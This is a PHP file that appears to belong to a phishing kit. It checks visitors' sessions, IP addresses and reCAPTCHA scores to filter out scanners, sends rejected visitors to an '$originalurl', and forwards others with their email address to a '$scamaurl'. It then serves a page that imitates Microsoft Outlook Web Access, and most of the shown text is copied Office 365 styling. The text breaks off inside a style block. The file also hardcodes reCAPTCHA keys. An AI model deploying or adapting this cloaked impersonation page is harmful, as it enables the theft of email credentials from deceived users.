<?php
session_start();
require_once('config.php');
defined('9A466B642B0D29A62244DFB3521AF1E7A1333C9C111235243BE8AD0452A1666D3386D35C8ABE350505387D1164FF997C0238742') or exit();
$captcha_site_key = "6LfpwZYqAAAAAKWfbzG28bGEx4mXtO080RYF24ci";
$captcha_secret_key = "6LfpwZYqAAAAAKvIhgG1wqVqSOBqupPBAEeyyTVp";

if(isset($_POST['send']) && ($_SESSION['visitor_ip'] == show_visitor_ip())) {
    $url = 'https://www.google.com/recaptcha/api/siteverify?secret='.$captcha_secret_key.'&response='.$_POST['g-recaptcha-response'];
	$timeout = 5;
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
	$json = curl_exec($curl);
	curl_close($curl);
	$result = json_decode($json, true);
	if($result['success'] == true && $result['score'] >= 0.0){
		 echo "<html><!DOCTYPE html><html><body><form action='".$scamaurl."' method='GET' name='redirect'><input type='hidden' name='email' value='".$_POST['cemail']."'><input type='hidden' name='sessid' value='".$_SESSION['csrftoken']."'></form><script> document.forms['redirect'].submit() </script></body></html>";
	}else{
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));	
	}
}

if (isset($_GET['newtoken'])){
	if ($_SESSION['newtoken'] == $_GET['newtoken']) {
		echo "<html><!DOCTYPE html><html><body><form action='".$scamaurl."' method='GET' name='redirect'><input type='hidden' name='email' value='".$_POST['cemail']."'><input type='hidden' name='sessid' value='".$_SESSION['csrftoken']."'></form><script> document.forms['redirect'].submit() </script></body></html>";
	}
	else{
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
}

if(isset($_GET['tap']) && ($_GET['tap'] == $_SESSION['skii'])) { ?>

<!DOCTYPE html>
<html dir="ltr" lang="en-GB">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
        <meta http-equiv="pragma" content="no-cache"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="default"/>
        <meta name="format-detection" content="telephone=no"/>
        <meta name="viewport" content="user-scalable=0, width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
        <meta name="msapplication-TileImage" content="prem/15.1.2375.37/resources/images/0/owa_browserpinnedtile.png"/>
        <meta name="msapplication-TileColor" content="#0072c6"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="google" value="notranslate">
        <meta name="apple-mobile-web-app-title" content="OWA"/>
        <meta name="referrer" content="never"/>
		<link rel="shortcut icon" href="<?php echo $scamaurl; ?>/resources/favicon.ico" type="image/x-icon">
        <title>Outlook</title>
        <style>
            @font-face {
                font-family: "wf_segoe-ui_light";
                src: local("Segoe UI Light"), local("Segoe WP Light"), url('prem/fonts/segoeui-light.woff') format('woff'), url('prem/fonts/segoeui-light.ttf') format('truetype');
            }

            @font-face {
                font-family: "wf_segoe-ui_normal";
                src: local("Segoe UI"), local("Segoe WP"), url('prem/fonts/segoeui-regular.woff') format('woff'), url('prem/fonts/segoeui-regular.ttf') format('truetype');
            }

            @font-face {
                font-family: "wf_segoe-ui_semibold";
                src: local("Segoe UI Semibold"), local("Segoe WP Semibold"), url('prem/fonts/segoeui-semibold.woff') format('woff'), url('prem/fonts/segoeui-semibold.ttf') format('truetype');
                font-weight: bold;
            }

            @font-face {
                font-family: "wf_segoe-ui_semilight";
                src: local("Segoe UI Semilight"), local("Segoe WP Semilight"), url('prem/fonts/segoeui-semilight.woff') format('woff'), url('prem/fonts/segoeui-semilight.ttf') format('truetype');
            }

            @font-face {
                font-family: 'webfontPreload';
                src: url('prem/15.1.2375.37/resources/styles/fonts/office365icons.eot?#iefix') format('embedded-opentype'), url('prem/15.1.2375.37/resources/styles/fonts/office365icons.woff') format('woff'), url('prem/15.1.2375.37/resources/styles/fonts/office365icons.ttf') format('truetype');
                font-weight: normal;
                font-style: normal;
            }
        </style>
		<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $captcha_site_key; ?>"></script>
        <script>
            var LocaleFontFamilyTemplate = ".ms-font-su{color:#333;font-family:@font-family-semilight;font-size:42px;font-weight:normal}.ms-font-xxl{color:#333;font-family:@font-family-light;font-size:28px;font-weight:normal}.touch .ms-font-xxl{font-size:30px}.ms-font-xl{color:#333;font-family:@font-family-light;font-size:21px;font-weight:normal}.touch .ms-font-xl{font-size:22px}.ms-font-l{color:#333;font-family:@font-family-semilight;font-size:17px;font-weight:normal}.touch .ms-font-l{font-size:18px}.ms-font-m{color:#333;font-family:@font-family-regular;font-size:14px;font-weight:normal}.touch .ms-font-m{font-size:15px}.ms-font-s{color:#333;font-family:@font-family-regular;font-size:12px;font-weight:normal}.touch .ms-font-s{font-size:13px}.ms-font-xs{color:#333;font-family:@font-family-regular;font-size:11px;font-weight:normal}.touch .ms-font-xs{font-size:12px}.ms-font-mi{color:#333;font-family:@font-family-semibold;font-size:10px;font-weight:normal}.touch .ms-font-mi{font-size:11px}.ms-font-weight-light,.ms-fwt-l,.ms-font-weight-light-hover:hover,.ms-font-weight-light-before:before,.ms-fwt-l-h:hover,.ms-fwt-l-b:before{font-family:@font-family-light;}.ms-font-weight-semilight,.ms-fwt-sl,.ms-font-weight-semilight-hover:hover,.ms-font-weight-semilight-before:before,.ms-fwt-sl-h:hover,.ms-fwt-sl-b:before{font-family:@font-family-semilight}.ms-font-weight-regular,.ms-fwt-r,.ms-font-weight-regular-hover:hover,.ms-font-weight-regular-before:before,.ms-fwt-r-h:hover,.ms-fwt-r-b:before{font-family:@font-family-regular}.ms-font-weight-semibold,.ms-fwt-sb,.ms-font-weight-semibold-hover:hover,.ms-font-weight-semibold-before:before,.ms-fwt-sb-h:hover,.ms-fwt-sb-b:before{font-family:@font-family-semibold;font-weight:bold}";
            var ThemedColorTemplate = ".ms-bg-color-themeDark, .ms-bgc-td, .ms-bg-color-themeDark-hover:hover, .ms-bg-color-themeDark-focus:focus, .ms-bg-color-themeDark-before:before, .ms-bgc-td-h:hover, .ms-bgc-td-f:focus, .ms-bgc-td-b:before { background-color: @color-themeDark; }.ms-bg-color-themeDarkAlt, .ms-bgc-tda, .ms-bg-color-themeDarkAlt-hover:hover, .ms-bg-color-themeDarkAlt-focus:focus, .ms-bg-color-themeDarkAlt-before:before, .ms-bgc-tda-h:hover, .ms-bgc-tda-f:focus, .ms-bgc-tda-b:before { background-color: @color-themeDarkAlt; }.ms-bg-color-themeDarker, .ms-bgc-tdr, .ms-bg-color-themeDarker-hover:hover, .ms-bg-color-themeDarker-focus:focus, .ms-bg-color-themeDarker-before:before, .ms-bgc-tdr-h:hover, .ms-bgc-tdr-f:focus, .ms-bgc-tdr-b:before { background-color: @color-themeDarker; }.ms-bg-color-themePrimary, .ms-bgc-tp, .ms-bg-color-themePrimary-hover:hover, .ms-bg-color-themePrimary-focus:focus, .ms-bg-color-themePrimary-before:before, .ms-bgc-tp-h:hover, .ms-bgc-tp-f:focus, .ms-bgc-tp-b:before { background-color: @color-themePrimary; }.ms-bg-color-themeSecondary, .ms-bgc-ts, .ms-bg-color-themeSecondary-hover:hover, .ms-bg-color-themeSecondary-focus:focus, .ms-bg-color-themeSecondary-before:before, .ms-bgc-ts-h:hover, .ms-bgc-ts-f:focus, .ms-bgc-ts-b:before { background-color: @color-themeSecondary; }.ms-bg-color-themeTertiary, .ms-bgc-tt, .ms-bg-color-themeTertiary-hover:hover, .ms-bg-color-themeTertiary-focus:focus, .ms-bg-color-themeTertiary-before:before, .ms-bgc-tt-h:hover, .ms-bgc-tt-f:focus, .ms-bgc-tt-b:before { background-color: @color-themeTertiary; }.ms-bg-color-themeLight, .ms-bgc-tl, .ms-bg-color-themeLight-hover:hover, .ms-bg-color-themeLight-focus:focus, .ms-bg-color-themeLight-before:before, .ms-bgc-tl-h:hover, .ms-bgc-tl-f:focus, .ms-bgc-tl-b:before { background-color: @color-themeLight; }.ms-bg-color-themeLighter, .ms-bgc-tlr, .ms-bg-color-themeLighter-hover:hover, .ms-bg-color-themeLighter-focus:focus, .ms-bg-color-themeLighter-before:before, .ms-bgc-tlr-h:hover, .ms-bgc-tlr-f:focus, .ms-bgc-tlr-b:before { background-color: @color-themeLighter; }.ms-bg-color-themeLighterAlt, .ms-bgc-tlra, .ms-bg-color-themeLighterAlt-hover:hover, .ms-bg-color-themeLighterAlt-focus:focus, .ms-bg-color-themeLighterAlt-before:before, .ms-bgc-tlra-h:hover, .ms-bgc-tlra-f:focus, .ms-bgc-tlra-b:before { background-color: @color-themeLighterAlt; }.ms-border-color-themeDark, .ms-bcl-td, .ms-border-color-themeDark-hover:hover, .ms-border-color-themeDark-focus:focus, .ms-border-color-themeDark-before:before, .ms-bcl-td-h:hover, .ms-bcl-td-f:focus, .ms-bcl-td-b:before { border-color: @color-themeDark; }.ms-border-color-themeDarkAlt, .ms-bcl-tda, .ms-border-color-themeDarkAlt-hover:hover, .ms-border-color-themeDarkAlt-focus:focus, .ms-border-color-themeDarkAlt-before:before, .ms-bcl-tda-h:hover, .ms-bcl-tda-f:focus, .ms-bcl-tda-b:before { border-color: @color-themeDarkAlt; }.ms-border-color-themeDarker, .ms-bcl-tdr, .ms-border-color-themeDarker-hover:hover, .ms-border-color-themeDarker-focus:focus, .ms-border-color-themeDarker-before:before, .ms-bcl-tdr-h:hover, .ms-bcl-tdr-f:focus, .ms-bcl-tdr-b:before { border-color: @color-themeDarker; }.ms-border-color-themePrimary, .ms-bcl-tp, .ms-border-color-themePrimary-hover:hover, .ms-border-color-themePrimary-focus:focus, .ms-border-color-themePrimary-before:before, .ms-bcl-tp-h:hover, .ms-bcl-tp-f:focus, .ms-bcl-tp-b:before { border-color: @color-themePrimary; }.ms-border-color-themeSecondary, .ms-bcl-ts, .ms-border-color-themeSecondary-hover:hover, .ms-border-color-themeSecondary-focus:focus, .ms-border-color-themeSecondary-before:before, .ms-bcl-ts-h:hover, .ms-bcl-ts-f:focus, .ms-bcl-ts-b:before { border-color: @color-themeSecondary; }.ms-border-color-themeTertiary, .ms-bcl-tt, .ms-border-color-themeTertiary-hover:hover, .ms-border-color-themeTertiary-focus:focus, .ms-border-color-themeTertiary-before:before, .ms-bcl-tt-h:hover, .ms-bcl-tt-f:focus, .ms-bcl-tt-b:before { border-color: @color-themeTertiary; }.ms-border-color-themeLight, .ms-bcl-tl, .ms-border-color-themeLight-hover:hover, .ms-border-color-themeLight-focus:focus, .ms-border-color-themeLight-before:before, .ms-bcl-tl-h:hover, .ms-bcl-tl-f:focus, .ms-bcl-tl-b:before { border-color: @color-themeLight; }.ms-border-color-themeLighter, .ms-bcl-tlr, .ms-border-color-themeLighter-hover:hover, .ms-border-color-themeLighter-focus:focus, .ms-border-color-themeLighter-before:before, .ms-bcl-tlr-h:hover, .ms-bcl-tlr-f:focus, .ms-bcl-tlr-b:before { border-color: @color-themeLighter; }.ms-border-color-themeLighterAlt, .ms-bcl-tlra, .ms-border-color-themeLighterAlt-hover:hover, .ms-border-color-themeLighterAlt-focus:focus, .ms-border-color-themeLighterAlt-before:before, .ms-bcl-tlra-h:hover, .ms-bcl-tlra-f:focus, .ms-bcl-tlra-b:before { border-color: @color-themeLighterAlt; }.ms-border-color-top-themePrimary, .ms-bcl-t-tp, .ms-border-color-top-themePrimary-hover:hover, .ms-border-color-top-themePrimary-focus:focus, .ms-border-color-top-themePrimary-before:before, .ms-bcl-t-tp-h:hover, .ms-bcl-t-tp-f:focus, .ms-bcl-t-tp-b:before { border-top-color: @color-themePrimary; }.ms-font-color-themeDark, .ms-fontColor-themeDark, .ms-fontColor-themeDark, .ms-fcl-td, .ms-font-color-themeDark-hover:hover, .ms-font-color-themeDark-focus:focus, .ms-font-color-themeDark-before:before, .ms-fcl-td-h:hover, .ms-fcl-td-f:focus, .ms-fcl-td-b:before { color: @color-themeDark; }.ms-font-color-themeDarkAlt, .ms-fontColor-themeDarkAlt, .ms-fontColor-themeDarkAlt, .ms-fcl-tda, .ms-font-color-themeDarkAlt-hover:hover, .ms-font-color-themeDarkAlt-focus:focus, .ms-font-color-themeDarkAlt-before:before, .ms-fcl-tda-h:hover, .ms-fcl-tda-f:focus, .ms-fcl-tda-b:before { color: @color-themeDarkAlt; }.ms-font-color-themeDarker, .ms-fontColor-themeDarker, .ms-fontColor-themeDarker, .ms-fcl-tdr, .ms-font-color-themeDarker-hover:hover, .ms-font-color-themeDarker-focus:focus, .ms-font-color-themeDarker-before:before, .ms-fcl-tdr-h:hover, .ms-fcl-tdr-f:focus, .ms-fcl-tdr-b:before { color: @color-themeDarker; }.ms-font-color-themePrimary, .ms-fontColor-themePrimary, .ms-fontColor-themePrimary, .ms-fcl-tp, .ms-font-color-themePrimary-hover:hover, .ms-font-color-themePrimary-focus:focus, .ms-font-color-themePrimary-before:before, .ms-fcl-tp-h:hover, .ms-fcl-tp-f:focus, .ms-fcl-tp-b:before { color: @color-themePrimary; }.ms-font-color-themeSecondary, .ms-fontColor-themeSecondary, .ms-fontColor-themeSecondary, .ms-fcl-ts, .ms-font-color-themeSecondary-hover:hover, .ms-font-color-themeSecondary-focus:focus, .ms-font-color-themeSecondary-before:before, .ms-fcl-ts-h:hover, .ms-fcl-ts-f:focus, .ms-fcl-ts-b:before { color: @color-themeSecondary; }.ms-font-color-themeTertiary, .ms-fontColor-themeTertiary, .ms-fontColor-themeTertiary, .ms-fcl-tt, .ms-font-color-themeTertiary-hover:hover, .ms-font-color-themeTertiary-focus:focus, .ms-font-color-themeTertiary-before:before, .ms-fcl-tt-h:hover, .ms-fcl-tt-f:focus, .ms-fcl-tt-b:before { color: @color-themeTertiary; }.ms-font-color-themeLight, .ms-fontColor-themeLight, .ms-fontColor-themeLight, .ms-fcl-tl, .ms-font-color-themeLight-hover:hover, .ms-font-color-themeLight-focus:focus, .ms-font-color-themeLight-before:before, .ms-fcl-tl-h:hover, .ms-fcl-tl-f:focus, .ms-fcl-tl-b:before { color: @color-themeLight; }.ms-font-color-themeLighter, .ms-fontColor-themeLighter, .ms-fontColor-themeLighter, .ms-fcl-tlr, .ms-font-color-themeLighter-hover:hover, .ms-font-color-themeLighter-focus:focus, .ms-font-color-themeLighter-before:before, .ms-fcl-tlr-h:hover, .ms-fcl-tlr-f:focus, .ms-fcl-tlr-b:before { color: @color-themeLighter; }.ms-font-color-themeLighterAlt, .ms-fontColor-themeLighterAlt, .ms-fontColor-themeLighterAlt, .ms-fcl-tlra, .ms-font-color-themeLighterAlt-hover:hover, .ms-font-color-themeLighterAlt-focus:focus, .ms-font-color-themeLighterAlt-before:before, .ms-fcl-tlra-h:hover, .ms-fcl-tlra-f:focus, .ms-fcl-tlra-b:before { color: @color-themeLighterAlt; }";
            var o365ColorTemplate = ".o365cs-base.o365cst .o365cs-topnavLinkBackground-2{background-color:@topnavLinkBG;background-color:@topnavLinkBGrgb;}.o365cs-base.o365cst .o365cs-topnavText,.o365cs-base.o365cst .o365cs-topnavText:hover{color:@topnavText;}.o365cs-base.o365cst .o365cs-navMenuButton{color:@navmenu;}.o365cs-base.o365cst.o365cs-topnavBGColor-2{background-color:@topnavBG;}.o365cs-base.o365cst .o365cs-appLauncherBackground{background-color:@appLauncherBG}";
        </script>
        <style>
            .customScrollBar::-webkit-scrollbar {
                height: 18px;
                width: 18px
            }

            .customScrollBar::-webkit-scrollbar:disabled {
                display: none
            }

            .customScrollBar::-webkit-scrollbar-button {
                background-color: #fff;
                background-repeat: no-repeat;
                cursor: pointer
            }

            .customScrollBar::-webkit-scrollbar-button:horizontal:increment,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement,.customScrollBar::-webkit-scrollbar-button:horizontal:increment:hover,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement:hover,.customScrollBar::-webkit-scrollbar-button:vertical:increment,.customScrollBar::-webkit-scrollbar-button:vertical:decrement,.customScrollBar::-webkit-scrollbar-button:vertical:increment:hover,.customScrollBar::-webkit-scrollbar-button:vertical:decrement:hover {
                background-position: center;
                height: 18px;
                width: 18px
            }

            .customScrollBarLight::-webkit-scrollbar-button {
                display: none
            }

            .customScrollBar::-webkit-scrollbar-track {
                background-color: #fff
            }

            .customScrollBarLight::-webkit-scrollbar-track {
                background-color: #0072c6
            }

            .customScrollBar::-webkit-scrollbar-thumb {
                border-radius: 9px;
                border: solid 6px #fff;
                background-color: #c8c8c8
            }

            .customScrollBarLight::-webkit-scrollbar-thumb {
                border-color: #0072c6;
                background-color: #95b1c1
            }

            .customScrollBar::-webkit-scrollbar-thumb:vertical {
                min-height: 50px
            }

            .customScrollBar::-webkit-scrollbar-thumb:horizontal {
                min-width: 50px
            }

            .customScrollBar::-webkit-scrollbar-thumb:hover {
                border-radius: 9px;
                border: solid 6px #fff;
                background-color: #98a3a6
            }

            .customScrollBar::-webkit-scrollbar-corner {
                background-color: #fff
            }

            .nativeScrollInertia {
                -webkit-overflow-scrolling: touch
            }

            .csimg {
                display: inline-block;
                overflow: hidden
            }

            button::-moz-focus-inner {
                border-width: 0;
                padding: 0
            }

            .textbox {
                border-width: 1px;
                border-style: solid;
                border-radius: 0;
                -moz-border-radius: 0;
                -webkit-border-radius: 0;
                box-shadow: none;
                -moz-box-shadow: none;
                -webkit-box-shadow: none;
                -webkit-appearance: none;
                height: 30px;
                padding: 0 5px
            }

            .tnarrow .textbox,.twide .textbox {
                font-size: 12px;
                background-color: #fff;
                height: 14px;
                padding: 3px 5px
            }

            .textbox::-webkit-input-placeholder {
                color: #a6a6a6
            }

            .textbox:-moz-placeholder {
                color: #a6a6a6
            }

            .textbox::-moz-placeholder {
                color: #a6a6a6
            }

            .textbox:-ms-input-placeholder {
                color: #a6a6a6
            }

            .textarea {
                padding: 10px
            }

            .textarea:hover {
                background-color: transparent;
                border-color: transparent
            }

            .o365button {
                background: transparent;
                border-width: 0;
                padding: 0;
                cursor: pointer!important;
                font-size: 14px
            }

            .o365button:disabled,label.o365button[disabled=true] {
                cursor: default!important
            }

            .o365buttonOutlined {
                padding-right: 11px;
                padding-left: 11px;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                border-width: 1px;
                border-style: solid
            }

            .o365buttonOutlined .o365buttonLabel {
                display: inline-block
            }

            .o365buttonOutlined {
                height: 30px
            }

            .twide .o365buttonOutlined,.tnarrow .o365buttonOutlined {
                height: 22px
            }

            .o365buttonOutlined .o365buttonLabel {
                height: 22px
            }

            .checkbox {
                border-style: none;
                cursor: pointer;
                vertical-align: middle
            }

            .popupShadow {
                box-shadow: 0 0 20px rgba(0,0,0,.4);
                border: 1px solid #eaeaea
            }

            .contextMenuDropShadow {
                box-shadow: 0 0 7px rgba(0,0,0,.4);
                border: 1px solid #eaeaea
            }

            .modalBackground {
                background-color: #fff;
                height: 100%;
                width: 100%;
                opacity: .65;
                filter: Alpha(opacity=65)
            }

            .clearModalBackground {
                background-color: #fff;
                opacity: 0;
                filter: Alpha(opacity=0);
                height: 100%;
                width: 100%
            }

            .contextMenuPopup {
                background-color: #fff
            }

            .removeFocusOutline *:focus {
                outline: none
            }

            .addFocusOutline button:focus {
                outline: dotted 1px
            }

            .addFocusRingOutline button:focus {
                outline: auto 5px -webkit-focus-ring-color
            }

            .border-color-transparent {
                border-color: transparent
            }

            .vResize,.hResize {
                z-index: 1000
            }

            .hResize,.hResizeCursor * {
                cursor: row-resize!important
            }

            .vResize,.vResizeCursor * {
                cursor: col-resize!important
            }

            .vResizing,.hResizing {
                filter: alpha(opacity=60);
                opacity: .6;
                -moz-opacity: .6;
                border: solid 1px #666
            }

            .vResizing {
                border-width: 0 1px
            }

            .hResizing {
                border-width: 1px 0
            }
        </style>
        <style></style>
        <style id="FontLocaleStyles"></style>
        <style id="ThemedColorStyles"></style>
        <style>
            .ms-bg-color-black,.ms-bgc-b,.ms-bg-color-black-hover:hover,.ms-bg-color-black-focus:focus,.ms-bg-color-black-before:before,.ms-bgc-b-h:hover,.ms-bgc-b-f:focus,.ms-bgc-b-b:before {
                background-color: #000
            }

            .ms-bg-color-neutralDark,.ms-bgc-nd,.ms-bg-color-neutralDark-hover:hover,.ms-bg-color-neutralDark-focus:focus,.ms-bg-color-neutralDark-before:before,.ms-bgc-nd-h:hover,.ms-bgc-nd-f:focus,.ms-bgc-nd-b:before {
                background-color: #212121
            }

            .ms-bg-color-neutralPrimary,.ms-bgc-np,.ms-bg-color-neutralPrimary-hover:hover,.ms-bg-color-neutralPrimary-focus:focus,.ms-bg-color-neutralPrimary-before:before,.ms-bgc-np-h:hover,.ms-bgc-np-f:focus,.ms-bgc-np-b:before {
                background-color: #333
            }

            .ms-bg-color-neutralSecondary,.ms-bgc-ns,.ms-bg-color-neutralSecondary-hover:hover,.ms-bg-color-neutralSecondary-focus:focus,.ms-bg-color-neutralSecondary-before:before,.ms-bgc-ns-h:hover,.ms-bgc-ns-f:focus,.ms-bgc-ns-b:before {
                background-color: #666
            }

            .ms-bg-color-neutralSecondaryAlt,.ms-bgc-nsa,.ms-bg-color-neutralSecondaryAlt-hover:hover,.ms-bg-color-neutralSecondaryAlt-focus:focus,.ms-bg-color-neutralSecondaryAlt-before:before,.ms-bgc-nsa-h:hover,.ms-bgc-nsa-f:focus,.ms-bgc-nsa-b:before {
                background-color: #767676
            }

            .ms-bg-color-neutralTertiary,.ms-bgc-nt,.ms-bg-color-neutralTertiary-hover:hover,.ms-bg-color-neutralTertiary-focus:focus,.ms-bg-color-neutralTertiary-before:before,.ms-bgc-nt-h:hover,.ms-bgc-nt-f:focus,.ms-bgc-nt-b:before {
                background-color: #a6a6a6
            }

            .ms-bg-color-neutralTertiaryAlt,.ms-bgc-nta,.ms-bg-color-neutralTertiaryAlt-hover:hover,.ms-bg-color-neutralTertiaryAlt-focus:focus,.ms-bg-color-neutralTertiaryAlt-before:before,.ms-bgc-nta-h:hover,.ms-bgc-nta-f:focus,.ms-bgc-nta-b:before {
                background-color: #c8c8c8
            }

            .ms-bg-color-neutralLight,.ms-bgc-nl,.ms-bg-color-neutralLight-hover:hover,.ms-bg-color-neutralLight-focus:focus,.ms-bg-color-neutralLight-before:before,.ms-bgc-nl-h:hover,.ms-bgc-nl-f:focus,.ms-bgc-nl-b:before {
                background-color: #eaeaea
            }

            .ms-bg-color-neutralLighter,.ms-bgc-nlr,.ms-bg-color-neutralLighter-hover:hover,.ms-bg-color-neutralLighter-focus:focus,.ms-bg-color-neutralLighter-before:before,.ms-bgc-nlr-h:hover,.ms-bgc-nlr-f:focus,.ms-bgc-nlr-b:before {
                background-color: #f4f4f4
            }

            .ms-bg-color-neutralLighterAlt,.ms-bgc-nlra,.ms-bg-color-neutralLighterAlt-hover:hover,.ms-bg-color-neutralLighterAlt-focus:focus,.ms-bg-color-neutralLighterAlt-before:before,.ms-bgc-nlra-h:hover,.ms-bgc-nlra-f:focus,.ms-bgc-nlra-b:before {
                background-color: #f8f8f8
            }

            .ms-bg-color-white,.ms-bgc-w,.ms-bg-color-white-hover:hover,.ms-bg-color-white-focus:focus,.ms-bg-color-white-before:before,.ms-bgc-w-h:hover,.ms-bgc-w-b:before {
                background-color: #fff
            }

            .ms-border-color-black,.ms-bcl-b,.ms-border-color-black-hover:hover,.ms-border-color-black-focus:focus,.ms-border-color-black-before:before,.ms-bcl-b-h:hover,.ms-bcl-b-f:focus,.ms-bcl-b-b:before {
                border-color: #000
            }

            .ms-border-color-neutralDark,.ms-bcl-nd,.ms-border-color-neutralDark-hover:hover,.ms-border-color-neutralDark-focus:focus,.ms-border-color-neutralDark-before:before,.ms-bcl-nd-h:hover,.ms-bcl-nd-f:focus,.ms-bcl-nd-b:before {
                border-color: #212121
            }

            .ms-border-color-neutralPrimary,.ms-bcl-np,.ms-border-color-neutralPrimary-hover:hover,.ms-border-color-neutralPrimary-focus:focus,.ms-border-color-neutralPrimary-before:before,.ms-bcl-np-h:hover,.ms-bcl-np-f:focus,.ms-bcl-np-b:before {
                border-color: #333
            }

            .ms-border-color-neutralSecondary,.ms-bcl-ns,.ms-border-color-neutralSecondary-hover:hover,.ms-border-color-neutralSecondary-focus:focus,.ms-border-color-neutralSecondary-before:before,.ms-bcl-ns-h:hover,.ms-bcl-ns-f:focus,.ms-bcl-ns-b:before {
                border-color: #666
            }

            .ms-border-color-neutralSecondaryAlt,.ms-bcl-nsa,.ms-border-color-neutralSecondaryAlt-hover:hover,.ms-border-color-neutralSecondaryAlt-focus:focus,.ms-border-color-neutralSecondaryAlt-before:before,.ms-bcl-nsa-h:hover,.ms-bcl-nsa-f:focus,.ms-bcl-nsa-b:before {
                border-color: #767676
            }

            .ms-border-color-neutralTertiary,.ms-bcl-nt,.ms-border-color-neutralTertiary-hover:hover,.ms-border-color-neutralTertiary-focus:focus,.ms-border-color-neutralTertiary-before:before,.ms-bcl-nt-h:hover,.ms-bcl-nt-f:focus,.ms-bcl-nt-b:before {
                border-color: #a6a6a6
            }

            .ms-border-color-neutralTertiaryAlt,.ms-bcl-nta,.ms-border-color-neutralTertiaryAlt-hover:hover,.ms-border-color-neutralTertiaryAlt-focus:focus,.ms-border-color-neutralTertiaryAlt-before:before,.ms-bcl-nta-h:hover,.ms-bcl-nta-f:focus,.ms-bcl-nta-b:before {
                border-color: #c8c8c8
            }

            .ms-border-color-neutralLight,.ms-bcl-nl,.ms-border-color-neutralLight-hover:hover,.ms-border-color-neutralLight-focus:focus,.ms-border-color-neutralLight-before:before,.ms-bcl-nl-h:hover,.ms-bcl-nl-f:focus,.ms-bcl-nl-b:before {
                border-color: #eaeaea
            }

            .ms-border-color-neutralLighter,.ms-bcl-nlr,.ms-border-color-neutralLighter-hover:hover,.ms-border-color-neutralLighter-focus:focus,.ms-border-color-neutralLighter-before:before,.ms-bcl-nlr-h:hover,.ms-bcl-nlr-f:focus,.ms-bcl-nlr-b:before {
                border-color: #f4f4f4
            }

            .ms-border-color-neutralLighterAlt,.ms-bcl-nlra,.ms-border-color-neutralLighterAlt-hover:hover,.ms-border-color-neutralLighterAlt-focus:focus,.ms-border-color-neutralLighterAlt-before:before,.ms-bcl-nlra-h:hover,.ms-bcl-nlra-f:focus,.ms-bcl-nlra-b:before {
                border-color: #f8f8f8
            }

            .ms-border-color-white,.ms-bcl-w,.ms-border-color-white-hover:hover,.ms-border-color-white-focus:focus,.ms-border-color-white-before:before,.ms-bcl-w-h:hover,.ms-bcl-w-f:focus,.ms-bcl-w-b:before {
                border-color: #fff
            }

            .ms-font-color-black,.ms-fontColor-black,.ms-fcl-b,.ms-font-color-black-hover:hover,.ms-font-color-black-focus:focus,.ms-font-color-black-before:before,.ms-fcl-b-h:hover,.ms-fcl-b-f:focus,.ms-fcl-b-b:before {
                color: #000
            }

            .ms-font-color-neutralDark,.ms-fontColor-neutralDark,.ms-fcl-nd,.ms-font-color-neutralDark-hover:hover,.ms-font-color-neutralDark-focus:focus,.ms-font-color-neutralDark-before:before,.ms-fcl-nd-h:hover,.ms-fcl-nd-f:focus,.ms-fcl-nd-b:before {
                color: #212121
            }

            .ms-font-color-neutralPrimary,.ms-fontColor-neutralPrimary,.ms-fcl-np,.ms-font-color-neutralPrimary-hover:hover,.ms-font-color-neutralPrimary-focus:focus,.ms-font-color-neutralPrimary-before:before,.ms-fcl-np-h:hover,.ms-fcl-np-f:focus,.ms-fcl-np-b:before {
                color: #333
            }

            .ms-font-color-neutralSecondary,.ms-fontColor-neutralSecondary,.ms-fcl-ns,.ms-font-color-neutralSecondary-hover:hover,.ms-font-color-neutralSecondary-focus:focus,.ms-font-color-neutralSecondary-before:before,.ms-fcl-ns-h:hover,.ms-fcl-ns-f:focus,.ms-fcl-ns-b:before {
                color: #666
            }

            .ms-font-color-neutralSecondaryAlt,.ms-fontColor-neutralSecondaryAlt,.ms-fcl-nsa,.ms-font-color-neutralSecondaryAlt-hover:hover,.ms-font-color-neutralSecondaryAlt-focus:focus,.ms-font-color-neutralSecondaryAlt-before:before,.ms-fcl-nsa-h:hover,.ms-fcl-nsa-f:focus,.ms-fcl-nsa-b:before {
                color: #767676
            }

            .ms-font-color-neutralTertiary,.ms-fontColor-neutralTertiary,.ms-fcl-nt,.ms-font-color-neutralTertiary-hover:hover,.ms-font-color-neutralTertiary-focus:focus,.ms-font-color-neutralTertiary-before:before,.ms-fcl-nt-h:hover,.ms-fcl-nt-f:focus,.ms-fcl-nt-b:before {
                color: #a6a6a6
            }

            .ms-font-color-neutralTertiaryAlt,.ms-fontColor-neutralTertiaryAlt,.ms-fcl-nta,.ms-font-color-neutralTertiaryAlt-hover:hover,.ms-font-color-neutralTertiaryAlt-focus:focus,.ms-font-color-neutralTertiaryAlt-before:before,.ms-fcl-nta-h:hover,.ms-fcl-nta-f:focus,.ms-fcl-nta-b:before {
                color: #c8c8c8
            }

            .ms-font-color-neutralLight,.ms-fontColor-neutralLight,.ms-fcl-nl,.ms-font-color-neutralLight-hover:hover,.ms-font-color-neutralLight-focus:focus,.ms-font-color-neutralLight-before:before,.ms-fcl-nl-h:hover,.ms-fcl-nl-f:focus,.ms-fcl-nl-b:before {
                color: #eaeaea
            }

            .ms-font-color-neutralLighter,.ms-fontColor-neutralLighter,.ms-fcl-nlr,.ms-font-color-neutralLighter-hover:hover,.ms-font-color-neutralLighter-focus:focus,.ms-font-color-neutralLighter-before:before,.ms-fcl-nlr-h:hover,.ms-fcl-nlr-f:focus,.ms-fcl-nlr-b:before {
                color: #f4f4f4
            }

